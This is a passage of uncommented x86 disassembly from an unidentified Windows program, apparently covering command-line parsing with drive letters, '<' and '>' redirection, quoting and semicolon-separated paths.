  405b85:	lea    esi,[esi+ecx*2]
  405b88:	pop    ecx
  405b89:	xor    eax,eax
  405b8b:	cmp    WORD PTR [esi],ax
  405b8e:	jne    0x405ac2
  405b94:	pop    edi
  405b95:	pop    esi
  405b96:	mov    eax,ebx
  405b98:	pop    ebx
  405b99:	leave  
  405b9a:	ret    
  405b9b:	push   ebp
  405b9c:	mov    ebp,esp
  405b9e:	push   ecx
  405b9f:	push   ecx
  405ba0:	mov    eax,edx
  405ba2:	push   ebx
  405ba3:	push   esi
  405ba4:	mov    esi,DWORD PTR [eax]
  405ba6:	push   edi
  405ba7:	mov    edi,DWORD PTR [eax+0x4]
  405baa:	mov    DWORD PTR [ebp-0x4],eax
  405bad:	movzx  eax,WORD PTR [esi]
  405bb0:	push   eax
  405bb1:	mov    ebx,ecx
  405bb3:	call   DWORD PTR ds:0x437404
  405bb9:	pop    ecx
  405bba:	push   0x3a
  405bbc:	xor    ecx,ecx
  405bbe:	pop    edx
  405bbf:	test   eax,eax
  405bc1:	je     0x405bf6
  405bc3:	cmp    WORD PTR [esi+0x2],dx
  405bc7:	jne    0x405bf6
  405bc9:	cmp    WORD PTR [esi+0x4],cx
  405bcd:	jne    0x405bf6
  405bcf:	movzx  eax,WORD PTR [esi]
  405bd2:	push   eax
  405bd3:	call   DWORD PTR ds:0x43740c
  405bd9:	movzx  eax,ax
  405bdc:	pop    ecx
  405bdd:	sub    eax,0x40
  405be0:	push   eax
  405be1:	call   DWORD PTR ds:0x437408
  405be7:	mov    eax,DWORD PTR [ebp+0x8]
  405bea:	xor    ebx,ebx
  405bec:	pop    ecx
  405bed:	mov    DWORD PTR [eax],ebx
  405bef:	mov    al,0x1
  405bf1:	jmp    0x405d41
  405bf6:	push   0x401670
  405bfb:	push   esi
  405bfc:	call   DWORD PTR ds:0x437548
  405c02:	pop    ecx
  405c03:	pop    ecx
  405c04:	test   eax,eax
  405c06:	jne    0x405c69
  405c08:	cmp    ebx,0x1
  405c0b:	je     0x405d3f
  405c11:	cmp    WORD PTR ds:0x4114c0,ax
  405c18:	je     0x405d3f
  405c1e:	call   0x4057f1
  405c23:	test   eax,eax
  405c25:	je     0x405d3f
  405c2b:	xor    ebx,ebx
  405c2d:	cmp    WORD PTR [eax],bx
  405c30:	je     0x405d3f
  405c36:	mov    ecx,eax
  405c38:	call   0x40dd18
  405c3d:	push   eax
  405c3e:	call   DWORD PTR ds:0x437410
  405c44:	mov    edi,DWORD PTR [ebp+0x8]
  405c47:	pop    ecx
  405c48:	mov    DWORD PTR [edi],eax
  405c4a:	cmp    eax,0xffffffff
  405c4d:	jne    0x405d2c
  405c53:	push   0x41f
  405c58:	push   DWORD PTR ds:0x4216e0
  405c5e:	call   0x405021
  405c63:	pop    ecx
  405c64:	jmp    0x405d2b
  405c69:	push   0x2
  405c6b:	push   0x401678
  405c70:	push   esi
  405c71:	call   DWORD PTR ds:0x437414
  405c77:	add    esp,0xc
  405c7a:	test   eax,eax
  405c7c:	jne    0x405c83
  405c7e:	add    esi,0x4
  405c81:	jmp    0x405c9f
  405c83:	push   0x5
  405c85:	push   0x401680
  405c8a:	push   esi
  405c8b:	call   DWORD PTR ds:0x437414
  405c91:	add    esp,0xc
  405c94:	test   eax,eax
  405c96:	jne    0x405d3f
  405c9c:	add    esi,0xa
  405c9f:	cmp    ebx,0x2
  405ca2:	jg     0x405d3f
  405ca8:	mov    edx,DWORD PTR [ebp-0x4]
  405cab:	mov    ecx,ebx
  405cad:	call   0x407149
  405cb2:	movzx  eax,WORD PTR [esi]
  405cb5:	test   ax,ax
  405cb8:	jne    0x405cfd
  405cba:	test   edi,edi
  405cbc:	je     0x405cfd
  405cbe:	movzx  eax,WORD PTR [edi]
  405cc1:	push   eax
  405cc2:	call   DWORD PTR ds:0x437404
  405cc8:	xor    ebx,ebx
  405cca:	pop    ecx
  405ccb:	test   eax,eax
  405ccd:	je     0x405cde
  405ccf:	push   0x3a
  405cd1:	pop    eax
  405cd2:	cmp    WORD PTR [edi+0x2],ax
  405cd6:	jne    0x405cde
  405cd8:	cmp    WORD PTR [edi+0x4],bx
  405cdc:	je     0x405d3f
  405cde:	mov    ecx,edi
  405ce0:	call   0x405a9d
  405ce5:	mov    esi,eax
  405ce7:	push   esi
  405ce8:	call   DWORD PTR ds:0x437550
  405cee:	mov    edi,DWORD PTR [ebp+0x8]
  405cf1:	pop    ecx
  405cf2:	push   esi
  405cf3:	mov    DWORD PTR [edi],eax
  405cf5:	call   DWORD PTR ds:0x43754c
  405cfb:	jmp    0x405d2b
  405cfd:	cmp    eax,0x2e
  405d00:	je     0x405d0c
  405d02:	cmp    eax,0x5c
  405d05:	je     0x405d0c
  405d07:	cmp    eax,0x2f
  405d0a:	jne    0x405d3f
  405d0c:	mov    ecx,esi
  405d0e:	call   0x405a9d
  405d13:	mov    esi,eax
  405d15:	push   esi
  405d16:	call   DWORD PTR ds:0x437550
  405d1c:	mov    edi,DWORD PTR [ebp+0x8]
  405d1f:	pop    ecx
  405d20:	push   esi
  405d21:	mov    DWORD PTR [edi],eax
  405d23:	call   DWORD PTR ds:0x43754c
  405d29:	xor    ebx,ebx
  405d2b:	pop    ecx
  405d2c:	cmp    DWORD PTR [edi],ebx
  405d2e:	je     0x405bef
  405d34:	mov    DWORD PTR [edi],0x1
  405d3a:	jmp    0x405bef
  405d3f:	xor    al,al
  405d41:	pop    edi
  405d42:	pop    esi
  405d43:	pop    ebx
  405d44:	leave  
  405d45:	ret    0x4
  405d48:	push   ebp
  405d49:	mov    ebp,esp
  405d4b:	sub    esp,0x14
  405d4e:	push   ebx
  405d4f:	push   esi
  405d50:	push   edi
  405d51:	mov    ebx,edx
  405d53:	push   0x20
  405d55:	mov    esi,ecx
  405d57:	mov    DWORD PTR [ebp-0x10],ebx
  405d5a:	pop    ecx
  405d5b:	movzx  eax,WORD PTR [esi]
  405d5e:	cmp    ax,cx
  405d61:	je     0x405d68
  405d63:	cmp    eax,0x9
  405d66:	jne    0x405d6d
  405d68:	add    esi,0x2
  405d6b:	jmp    0x405d5b
  405d6d:	xor    eax,eax
  405d6f:	push   0x40168c
  405d74:	push   esi
  405d75:	mov    DWORD PTR [ebp-0xc],eax
  405d78:	call   DWORD PTR ds:0x437544
  405d7e:	mov    edi,eax
  405d80:	pop    ecx
  405d81:	pop    ecx
  405d82:	test   edi,edi
  405d84:	je     0x405d91
  405d86:	movzx  eax,WORD PTR [edi]
  405d89:	mov    DWORD PTR [ebp-0xc],eax
  405d8c:	xor    eax,eax
  405d8e:	mov    WORD PTR [edi],ax
  405d91:	call   DWORD PTR ds:0x43741c
  405d97:	xor    ecx,ecx
  405d99:	cmp    ebx,0x4
  405d9c:	je     0x405db4
  405d9e:	add    eax,0x20
  405da1:	cmp    ebx,0x2
  405da4:	setne  cl
  405da7:	dec    ecx
  405da8:	and    ecx,0x1f8
  405dae:	add    ecx,0x109
  405db4:	and    DWORD PTR [ebp-0x8],0x0
  405db8:	push   0x180
  405dbd:	push   0x40
  405dbf:	push   ecx
  405dc0:	mov    DWORD PTR [ebp-0x4],eax
  405dc3:	lea    eax,[ebp-0x8]
  405dc6:	push   esi
  405dc7:	push   eax
  405dc8:	call   DWORD PTR ds:0x437420
  405dce:	add    esp,0x14
  405dd1:	mov    ebx,eax
  405dd3:	neg    ebx
  405dd5:	sbb    bl,bl
  405dd7:	inc    bl
  405dd9:	je     0x405e22
  405ddb:	push   DWORD PTR [ebp-0x4]
  405dde:	call   DWORD PTR ds:0x437428
  405de4:	pop    ecx
  405de5:	push   eax
  405de6:	push   DWORD PTR [ebp-0x8]
  405de9:	call   DWORD PTR ds:0x437424
  405def:	pop    ecx
  405df0:	pop    ecx
  405df1:	cmp    eax,0xffffffff
  405df4:	jne    0x405e04
  405df6:	push   0x411
  405dfb:	push   0x0
  405dfd:	call   0x405021
  405e02:	pop    ecx
  405e03:	pop    ecx
  405e04:	cmp    DWORD PTR [ebp-0x10],0x3
  405e08:	jne    0x405e22
  405e0a:	push   0x2
  405e0c:	push   0x0
  405e0e:	push   DWORD PTR [ebp-0x4]
  405e11:	call   DWORD PTR ds:0x437428
  405e17:	pop    ecx
  405e18:	push   eax
  405e19:	call   DWORD PTR ds:0x43742c
  405e1f:	add    esp,0xc
  405e22:	xor    eax,eax
  405e24:	cmp    WORD PTR [esi],ax
  405e27:	je     0x405e37
  405e29:	push   0x20
  405e2b:	pop    ecx
  405e2c:	mov    WORD PTR [esi],cx
  405e2f:	lea    esi,[esi+0x2]
  405e32:	cmp    WORD PTR [esi],ax
  405e35:	jne    0x405e2c
  405e37:	test   edi,edi
  405e39:	je     0x405e41
  405e3b:	mov    eax,DWORD PTR [ebp-0xc]
  405e3e:	mov    WORD PTR [edi],ax
  405e41:	pop    edi
  405e42:	pop    esi
  405e43:	mov    al,bl
  405e45:	pop    ebx
  405e46:	leave  
  405e47:	ret    
  405e48:	push   ebp
  405e49:	mov    ebp,esp
  405e4b:	sub    esp,0x14
  405e4e:	push   ebx
  405e4f:	push   esi
  405e50:	push   edi
  405e51:	mov    eax,ecx
  405e53:	push   0x401698
  405e58:	xor    bh,bh
  405e5a:	push   eax
  405e5b:	mov    DWORD PTR [ebp-0x10],eax
  405e5e:	mov    BYTE PTR [ebp-0x1],bh
  405e61:	xor    bl,bl
  405e63:	mov    DWORD PTR [ebp-0x8],eax
  405e66:	xor    edi,edi
  405e68:	call   DWORD PTR ds:0x437544
  405e6e:	mov    esi,eax
  405e70:	pop    ecx
  405e71:	pop    ecx
  405e72:	test   esi,esi
  405e74:	je     0x406043
  405e7a:	push   0x3e
  405e7c:	pop    edx
  405e7d:	push   0x20
  405e7f:	pop    ecx
  405e80:	movzx  eax,WORD PTR [esi]
  405e83:	sub    eax,0x3c
  405e86:	je     0x405f19
  405e8c:	dec    eax
  405e8d:	dec    eax
  405e8e:	je     0x405eab
  405e90:	sub    eax,edx
  405e92:	je     0x405f8c
  405e98:	push   0x411
  405e9d:	push   0x0
  405e9f:	call   0x405021
  405ea4:	pop    ecx
  405ea5:	pop    ecx
  405ea6:	jmp    0x405f67
  405eab:	cmp    BYTE PTR [ebp-0x1],0x0
  405eaf:	jne    0x405f8c
  405eb5:	test   edi,edi
  405eb7:	jne    0x405ec9
  405eb9:	mov    ecx,DWORD PTR [ebp-0x8]
  405ebc:	call   0x40dd18
  405ec1:	push   0x20
  405ec3:	pop    ecx
  405ec4:	push   0x3e
  405ec6:	mov    edi,eax
  405ec8:	pop    edx
  405ec9:	mov    WORD PTR [esi],cx
  405ecc:	add    esi,0x2
  405ecf:	mov    DWORD PTR [ebp-0x8],esi
  405ed2:	mov    BYTE PTR [ebp-0x1],0x1
  405ed6:	cmp    WORD PTR [esi],dx
  405ed9:	jne    0x405eea
  405edb:	mov    WORD PTR [esi],cx
  405ede:	add    esi,0x2
  405ee1:	mov    DWORD PTR [ebp-0xc],0x3
  405ee8:	jmp    0x405ef1
  405eea:	mov    DWORD PTR [ebp-0xc],0x2
  405ef1:	call   DWORD PTR ds:0x43741c
  405ef7:	add    eax,0x20
  405efa:	push   eax
  405efb:	call   DWORD PTR ds:0x437428
  405f01:	pop    ecx
  405f02:	push   eax
  405f03:	call   DWORD PTR ds:0x437430
  405f09:	pop    ecx
  405f0a:	mov    ecx,DWORD PTR [ebp+0xc]
  405f0d:	mov    DWORD PTR [ecx],eax
  405f0f:	cmp    eax,0xffffffff
  405f12:	je     0x405f8c
  405f14:	mov    edx,DWORD PTR [ebp-0xc]
  405f17:	jmp    0x405f5c
  405f19:	test   bh,bh
  405f1b:	jne    0x405f8c
  405f1d:	test   edi,edi
  405f1f:	jne    0x405f2e
  405f21:	mov    ecx,DWORD PTR [ebp-0x8]
  405f24:	call   0x40dd18
  405f29:	push   0x20
  405f2b:	mov    edi,eax
  405f2d:	pop    ecx
  405f2e:	mov    WORD PTR [esi],cx
  405f31:	add    esi,0x2
  405f34:	mov    DWORD PTR [ebp-0x8],esi
  405f37:	mov    bh,0x1
  405f39:	call   DWORD PTR ds:0x43741c
  405f3f:	push   eax
  405f40:	call   DWORD PTR ds:0x437428
  405f46:	pop    ecx
  405f47:	push   eax
  405f48:	call   DWORD PTR ds:0x437430
  405f4e:	pop    ecx
  405f4f:	mov    ecx,DWORD PTR [ebp+0x8]
  405f52:	mov    DWORD PTR [ecx],eax
  405f54:	cmp    eax,0xffffffff
  405f57:	je     0x405f8c
  405f59:	push   0x4
  405f5b:	pop    edx
  405f5c:	mov    ecx,esi
  405f5e:	call   0x405d48
  405f63:	test   al,al
  405f65:	je     0x405f8c
  405f67:	push   0x401698
  405f6c:	push   DWORD PTR [ebp-0x8]
  405f6f:	call   DWORD PTR ds:0x437544
  405f75:	mov    esi,eax
  405f77:	pop    ecx
  405f78:	pop    ecx
  405f79:	test   esi,esi
  405f7b:	je     0x406043
  405f81:	push   0x20
  405f83:	pop    ecx
  405f84:	push   0x3e
  405f86:	pop    edx
  405f87:	jmp    0x405e80
  405f8c:	mov    bl,0x1
  405f8e:	test   edi,edi
  405f90:	je     0x405fa9
  405f92:	push   edi
  405f93:	push   0xffffffff
  405f95:	push   DWORD PTR [ebp-0x10]
  405f98:	call   DWORD PTR ds:0x4373d0
  405f9e:	add    esp,0xc
  405fa1:	push   edi
  405fa2:	call   DWORD PTR ds:0x43754c
  405fa8:	pop    ecx
  405fa9:	mov    edi,DWORD PTR ds:0x437424
  405faf:	mov    esi,DWORD PTR ds:0x437434
  405fb5:	test   bh,bh
  405fb7:	je     0x405ffa
  405fb9:	mov    eax,DWORD PTR [ebp+0x8]
  405fbc:	cmp    DWORD PTR [eax],0xffffffff
  405fbf:	je     0x405ffa
  405fc1:	call   DWORD PTR ds:0x43741c
  405fc7:	push   eax
  405fc8:	call   DWORD PTR ds:0x437428
  405fce:	pop    ecx
  405fcf:	push   eax
  405fd0:	mov    eax,DWORD PTR [ebp+0x8]
  405fd3:	push   DWORD PTR [eax]
  405fd5:	call   edi
  405fd7:	pop    ecx
  405fd8:	pop    ecx
  405fd9:	cmp    eax,0xffffffff
  405fdc:	jne    0x405fec
  405fde:	push   0x411
  405fe3:	push   0x0
  405fe5:	call   0x405021
  405fea:	pop    ecx
  405feb:	pop    ecx
  405fec:	mov    eax,DWORD PTR [ebp+0x8]
  405fef:	push   DWORD PTR [eax]
  405ff1:	call   esi
  405ff3:	mov    eax,DWORD PTR [ebp+0x8]
  405ff6:	pop    ecx
  405ff7:	or     DWORD PTR [eax],0xffffffff
  405ffa:	cmp    BYTE PTR [ebp-0x1],0x0
  405ffe:	je     0x406043
  406000:	mov    eax,DWORD PTR [ebp+0xc]
  406003:	cmp    DWORD PTR [eax],0xffffffff
  406006:	je     0x406043
  406008:	call   DWORD PTR ds:0x43741c
  40600e:	push   0x20
  406010:	pop    ecx
  406011:	add    eax,ecx
  406013:	push   eax
  406014:	call   DWORD PTR ds:0x437428
  40601a:	pop    ecx
  40601b:	push   eax
  40601c:	mov    eax,DWORD PTR [ebp+0xc]
  40601f:	push   DWORD PTR [eax]
  406021:	call   edi
  406023:	pop    ecx
  406024:	pop    ecx
  406025:	cmp    eax,0xffffffff
  406028:	jne    0x406038
  40602a:	push   0x411
  40602f:	push   0x0
  406031:	call   0x405021
  406036:	pop    ecx
  406037:	pop    ecx
  406038:	mov    edi,DWORD PTR [ebp+0xc]
  40603b:	push   DWORD PTR [edi]
  40603d:	call   esi
  40603f:	or     DWORD PTR [edi],0xffffffff
  406042:	pop    ecx
  406043:	pop    edi
  406044:	pop    esi
  406045:	mov    al,bl
  406047:	pop    ebx
  406048:	leave  
  406049:	ret    0x8
  40604c:	xor    eax,eax
  40604e:	inc    eax
  40604f:	ret    0x4
  406052:	push   ebp
  406053:	mov    ebp,esp
  406055:	push   ecx
  406056:	push   ecx
  406057:	push   esi
  406058:	mov    esi,ecx
  40605a:	push   edi
  40605b:	mov    edi,edx
  40605d:	test   esi,esi
  40605f:	jne    0x406068
  406061:	xor    al,al
  406063:	jmp    0x4060ea
  406068:	push   ebx
  406069:	push   0x2
  40606b:	pop    ebx
  40606c:	push   0x3b
  40606e:	pop    eax
  40606f:	mov    edx,esi
  406071:	mov    DWORD PTR [ebp-0x8],eax
  406074:	cmp    WORD PTR [esi],ax
  406077:	jne    0x406080
  406079:	add    ecx,ebx
  40607b:	cmp    WORD PTR [ecx],ax
  40607e:	je     0x406079
  406080:	movzx  eax,WORD PTR [ecx]
  406083:	test   ax,ax
  406086:	je     0x4060d1
  406088:	mov    DWORD PTR [ebp-0x4],0x22
  40608f:	cmp    ax,WORD PTR [ebp-0x8]
  406093:	je     0x4060d1
  406095:	cmp    ax,WORD PTR [ebp-0x4]
  406099:	jne    0x4060c2
  40609b:	add    ecx,ebx
  40609d:	movzx  eax,WORD PTR [ecx]
  4060a0:	test   ax,ax
  4060a3:	je     0x4060d1
  4060a5:	cmp    ax,WORD PTR [ebp-0x4]
  4060a9:	je     0x4060ba
  4060ab:	add    ecx,ebx
  4060ad:	mov    WORD PTR [edx],ax
  4060b0:	movzx  eax,WORD PTR [ecx]
  4060b3:	add    edx,ebx
  4060b5:	test   ax,ax
  4060b8:	jne    0x4060a5
  4060ba:	cmp    WORD PTR [ecx],0x0
  4060be:	je     0x4060d1
  4060c0:	jmp    0x4060c7
  4060c2:	mov    WORD PTR [edx],ax
  4060c5:	add    edx,ebx
  4060c7:	add    ecx,ebx
  4060c9:	movzx  eax,WORD PTR [ecx]
  4060cc:	test   ax,ax
  4060cf:	jne    0x40608f
  4060d1:	lea    eax,[ecx+0x2]
  4060d4:	movzx  ecx,WORD PTR [ecx]
  4060d7:	neg    ecx
  4060d9:	sbb    ecx,ecx
  4060db:	and    ecx,eax
  4060dd:	xor    eax,eax
  4060df:	cmp    edx,esi
  4060e1:	mov    WORD PTR [edx],ax
  4060e4:	mov    DWORD PTR [edi],ecx
  4060e6:	setne  al
  4060e9:	pop    ebx
  4060ea:	pop    edi
  4060eb:	pop    esi
  4060ec:	leave  
  4060ed:	ret    
  4060ee:	push   ebp
  4060ef:	mov    ebp,esp
  4060f1:	sub    esp,0x640
  4060f7:	mov    eax,ds:0x411018
  4060fc:	xor    eax,ebp
  4060fe:	mov    DWORD PTR [ebp-0x8],eax
  406101:	push   ebx
  406102:	push   esi
  406103:	push   edi
  406104:	push   0x2
  406106:	pop    edi
  406107:	push   0x22
  406109:	xor    ebx,ebx
  40610b:	pop    eax
  40610c:	mov    DWORD PTR [ebp-0x628],edx
  406112:	mov    BYTE PTR [ebp-0x615],bl
  406118:	cmp    WORD PTR [ecx],ax
  40611b:	jne    0x4061db
  406121:	mov    edx,ecx
  406123:	lea    esi,[edx+0x2]
  406126:	mov    ax,WORD PTR [edx]
  406129:	add    edx,edi
  40612b:	cmp    ax,bx
  40612e:	jne    0x406126
  406130:	sub    edx,esi
  406132:	sar    edx,1
  406134:	dec    edx
  406135:	push   0x22
  406137:	lea    ebx,[ecx+edx*2]
  40613a:	pop    edx
  40613b:	mov    DWORD PTR [ebp-0x634],ebx
  406141:	cmp    dx,WORD PTR [ebx]
  406144:	jne    0x406171
  406146:	mov    BYTE PTR [ebp-0x615],0x1
  40614d:	add    ecx,edi
  40614f:	cmp    dx,WORD PTR [ecx]
  406152:	je     0x40614d
  406154:	cmp    ebx,ecx
  406156:	jbe    0x40616c
  406158:	lea    eax,[ebx-0x2]
  40615b:	cmp    dx,WORD PTR [eax]
  40615e:	jne    0x406166
  406160:	mov    ebx,eax
  406162:	cmp    eax,ecx
  406164:	ja     0x406158
  406166:	mov    DWORD PTR [ebp-0x634],ebx
  40616c:	xor    eax,eax
  40616e:	mov    WORD PTR [ebx],ax
  406171:	xor    ebx,ebx
  406173:	mov    edx,0x100
  406178:	push   edx
  406179:	lea    eax,[ebp-0x214]
  40617f:	push   eax
  406180:	push   edx
  406181:	lea    eax,[ebp-0x614]
  406187:	push   eax
  406188:	push   edx
  406189:	lea    eax,[ebp-0x414]
  40618f:	push   eax
  406190:	push   0x3
  406192:	lea    eax,[ebp-0x10]
  406195:	push   eax
  406196:	push   ecx
  406197:	call   DWORD PTR ds:0x437438
  40619d:	mov    esi,DWORD PTR ds:0x437418
  4061a3:	add    esp,0x24
  4061a6:	cmp    WORD PTR [ebp-0x214],0x0
  4061ae:	je     0x4061e9
  4061b0:	lea    ecx,[ebp-0x214]
  4061b6:	lea    edx,[ecx+0x2]
  4061b9:	mov    ax,WORD PTR [ecx]
  4061bc:	add    ecx,edi
  4061be:	cmp    ax,bx
  4061c1:	jne    0x4061b9
  4061c3:	sub    ecx,edx
  4061c5:	sar    ecx,1
  4061c7:	lea    ebx,[ebp-0x214]
  4061cd:	lea    eax,[ecx+0x1]
  4061d0:	mov    DWORD PTR [ebp-0x620],eax
  4061d6:	jmp    0x406278
  4061db:	mov    eax,DWORD PTR [ebp-0x630]
  4061e1:	mov    DWORD PTR [ebp-0x634],eax
  4061e7:	jmp    0x406173
  4061e9:	push   0x4016a0
  4061ee:	push   ebx
  4061ef:	lea    eax,[ebp-0x620]
  4061f5:	push   ebx
  4061f6:	push   eax
  4061f7:	call   esi
  4061f9:	add    esp,0x10
  4061fc:	test   eax,eax
  4061fe:	jne    0x406248
  406200:	mov    eax,DWORD PTR [ebp-0x620]
  406206:	test   eax,eax
  406208:	je     0x406248
  40620a:	xor    ecx,ecx
  40620c:	mul    edi
  40620e:	seto   cl
  406211:	neg    ecx
  406213:	or     ecx,eax
  406215:	call   0x40a2fb
  40621a:	push   0x4016a0
  40621f:	push   DWORD PTR [ebp-0x620]
  406225:	mov    ebx,eax
  406227:	lea    eax,[ebp-0x620]
  40622d:	push   ebx
  40622e:	push   eax
  40622f:	call   esi
  406231:	add    esp,0x10
  406234:	test   eax,eax
  406236:	je     0x406244
  406238:	push   ebx
  406239:	call   DWORD PTR ds:0x43754c
  40623f:	xor    eax,eax
  406241:	pop    ecx
  406242:	mov    ebx,eax
  406244:	test   ebx,ebx
  406246:	jne    0x406278
  406248:	push   0x21
  40624a:	pop    eax
  40624b:	xor    ecx,ecx
  40624d:	mov    DWORD PTR [ebp-0x620],eax
  406253:	mul    edi
  406255:	seto   cl
  406258:	neg    ecx
  40625a:	or     ecx,eax
  40625c:	call   0x40a2fb
  406261:	push   0x401128
  406266:	push   DWORD PTR [ebp-0x620]
  40626c:	mov    ebx,eax
  40626e:	push   ebx
  40626f:	call   DWORD PTR ds:0x4373d0
  406275:	add    esp,0xc
  406278:	cmp    WORD PTR [ebp-0x10],0x0
  40627d:	jne    0x406395
  406283:	cmp    WORD PTR [ebp-0x414],0x0
  40628b:	jne    0x406395
  406291:	xor    eax,eax
  406293:	push   0x4016b0
  406298:	push   eax
  406299:	push   eax
  40629a:	lea    eax,[ebp-0x61c]
  4062a0:	push   eax
  4062a1:	call   esi
  4062a3:	add    esp,0x10
  4062a6:	test   eax,eax
  4062a8:	jne    0x4062b2
  4062aa:	cmp    DWORD PTR [ebp-0x61c],eax
  4062b0:	jne    0x4062bc
  4062b2:	mov    DWORD PTR [ebp-0x61c],0x1
  4062bc:	mov    eax,ds:0x435684
  4062c1:	test   eax,eax
  4062c3:	jne    0x4062ef
  4062c5:	push   0x4016bc
  4062ca:	call   DWORD PTR ds:0x4372f0
  4062d0:	push   0x4016d8
  4062d5:	push   eax
  4062d6:	call   DWORD PTR ds:0x4372f4
  4062dc:	mov    ds:0x435684,eax
  4062e1:	test   eax,eax
  4062e3:	jne    0x4062ef
  4062e5:	mov    eax,0x40604c
  4062ea:	mov    ds:0x435684,eax
  4062ef:	lea    ecx,[ebp-0x614]
  4062f5:	push   ecx
  4062f6:	call   eax
  4062f8:	mov    DWORD PTR [ebp-0x624],eax
  4062fe:	test   eax,eax
  406300:	mov    eax,DWORD PTR [ebp-0x61c]
  406306:	je     0x406310
  406308:	add    eax,edi
  40630a:	mov    DWORD PTR [ebp-0x61c],eax
  406310:	xor    ecx,ecx
  406312:	mul    edi
  406314:	seto   cl
  406317:	neg    ecx
  406319:	or     ecx,eax
  40631b:	call   0x40a2fb
  406320:	cmp    DWORD PTR [ebp-0x624],0x0
  406327:	mov    edi,eax
  406329:	mov    DWORD PTR [ebp-0x62c],edi
  40632f:	mov    esi,edi
  406331:	je     0x40635e
  406333:	push   0x4016f8
  406338:	push   DWORD PTR [ebp-0x61c]
  40633e:	push   edi
  40633f:	call   DWORD PTR ds:0x4373d0
  406345:	mov    eax,DWORD PTR [ebp-0x61c]
  40634b:	add    esp,0xc
  40634e:	lea    esi,[edi+0x4]
  406351:	push   0x2
  406353:	pop    ecx
  406354:	sub    eax,ecx
  406356:	mov    DWORD PTR [ebp-0x61c],eax
  40635c:	jmp    0x406364
  40635e:	mov    eax,DWORD PTR [ebp-0x61c]
  406364:	push   0x4016b0
  406369:	push   eax
  40636a:	lea    eax,[ebp-0x61c]
  406370:	push   esi
  406371:	push   eax
  406372:	call   DWORD PTR ds:0x437418
  406378:	add    esp,0x10
  40637b:	test   eax,eax
  40637d:	jne    0x40638b
  40637f:	cmp    DWORD PTR [ebp-0x61c],eax
  406385:	jne    0x406418
  40638b:	xor    eax,eax
  40638d:	mov    WORD PTR [esi],ax
  406390:	jmp    0x406418
  406395:	lea    ecx,[ebp-0x10]
  406398:	push   0x2
  40639a:	lea    edx,[ecx+0x2]
  40639d:	xor    edi,edi
  40639f:	pop    esi
  4063a0:	mov    ax,WORD PTR [ecx]
  4063a3:	add    ecx,esi
  4063a5:	cmp    ax,di
  4063a8:	jne    0x4063a0
  4063aa:	sub    ecx,edx
  4063ac:	lea    edx,[ebp-0x414]
  4063b2:	sar    ecx,1
  4063b4:	lea    esi,[edx+0x2]
  4063b7:	mov    ax,WORD PTR [edx]
  4063ba:	add    edx,0x2
  4063bd:	cmp    ax,di
  4063c0:	jne    0x4063b7
  4063c2:	sub    edx,esi
  4063c4:	sar    edx,1
  4063c6:	push   0x2
  4063c8:	lea    esi,[edx+0x1]
  4063cb:	add    esi,ecx
  4063cd:	xor    ecx,ecx
  4063cf:	pop    edx
  4063d0:	mov    eax,esi
  4063d2:	mul    edx
  4063d4:	seto   cl
  4063d7:	neg    ecx
  4063d9:	or     ecx,eax
  4063db:	call   0x40a2fb
  4063e0:	mov    edi,eax
  4063e2:	xor    eax,eax
  4063e4:	push   eax
  4063e5:	push   eax
  4063e6:	lea    eax,[ebp-0x414]
  4063ec:	push   eax
  4063ed:	lea    eax,[ebp-0x10]
  4063f0:	push   eax
  4063f1:	push   esi
  4063f2:	push   edi
  4063f3:	mov    DWORD PTR [ebp-0x62c],edi
  4063f9:	call   DWORD PTR ds:0x43743c
  4063ff:	add    esp,0x18
  406402:	test   eax,eax
  406404:	je     0x406418
  406406:	push   edi
  406407:	call   DWORD PTR ds:0x43754c
  40640d:	xor    eax,eax
  40640f:	pop    ecx
  406410:	mov    edi,eax
  406412:	mov    DWORD PTR [ebp-0x62c],eax
  406418:	lea    edx,[ebp-0x624]
  40641e:	mov    ecx,edi
  406420:	mov    DWORD PTR [ebp-0x640],edi
  406426:	call   0x406052
  40642b:	test   al,al
  40642d:	je     0x406577
  406433:	mov    eax,DWORD PTR [ebp-0x620]
  406439:	xor    ecx,ecx
  40643b:	push   0x2
  40643d:	pop    edx
  40643e:	mul    edx
  406440:	seto   cl
  406443:	neg    ecx
  406445:	or     ecx,eax
  406447:	call   0x40a2fb
  40644c:	push   ebx
  40644d:	push   DWORD PTR [ebp-0x620]
  406453:	mov    esi,eax
  406455:	push   esi
  406456:	mov    DWORD PTR [ebp-0x630],esi
  40645c:	call   DWORD PTR ds:0x4373d0
  406462:	add    esp,0xc
  406465:	mov    DWORD PTR [ebp-0x63c],esi
  40646b:	mov    ecx,esi
  40646d:	jmp    0x4064be
  40646f:	push   DWORD PTR [ebp-0x63c]
  406475:	lea    eax,[ebp-0x614]
  40647b:	push   eax
  40647c:	push   DWORD PTR [ebp-0x640]
  406482:	xor    eax,eax
  406484:	push   eax
  406485:	push   0x104
  40648a:	push   DWORD PTR [ebp-0x628]
  406490:	call   DWORD PTR ds:0x43743c
  406496:	add    esp,0x18
  406499:	test   eax,eax
  40649b:	jne    0x4064b0
  40649d:	push   eax
  40649e:	push   DWORD PTR [ebp-0x628]
  4064a4:	call   DWORD PTR ds:0x437440
  4064aa:	pop    ecx
  4064ab:	pop    ecx
  4064ac:	test   eax,eax
  4064ae:	je     0x4064f3
  4064b0:	mov    eax,DWORD PTR [ebp-0x638]
  4064b6:	mov    DWORD PTR [ebp-0x63c],eax
  4064bc:	mov    ecx,eax
  4064be:	lea    edx,[ebp-0x638]
  4064c4:	call   0x406052
  4064c9:	test   al,al
  4064cb:	jne    0x40646f
  4064cd:	mov    eax,DWORD PTR [ebp-0x624]
  4064d3:	lea    edx,[ebp-0x624]
  4064d9:	mov    ecx,eax
  4064db:	mov    DWORD PTR [ebp-0x640],eax
  4064e1:	call   0x406052
  4064e6:	test   al,al
  4064e8:	jne    0x406433
  4064ee:	jmp    0x40657d
  4064f3:	cmp    BYTE PTR [ebp-0x615],0x0
  4064fa:	je     0x406557
  4064fc:	mov    edx,DWORD PTR [ebp-0x628]
  406502:	mov    edi,edx
  406504:	xor    esi,esi
  406506:	lea    ecx,[edi+0x2]
  406509:	mov    ax,WORD PTR [edi]
  40650c:	add    edi,0x2
  40650f:	cmp    ax,si
  406512:	jne    0x406509
  406514:	sub    edi,ecx
  406516:	sar    edi,1
  406518:	lea    eax,[edx+0x2]
  40651b:	lea    esi,[edi+edi*1]
  40651e:	push   esi
  40651f:	push   edx
  406520:	push   eax
  406521:	call   DWORD PTR ds:0x437444
  406527:	mov    eax,DWORD PTR [ebp-0x628]
  40652d:	add    esp,0xc
  406530:	xor    ecx,ecx
  406532:	push   0x22
  406534:	pop    edx
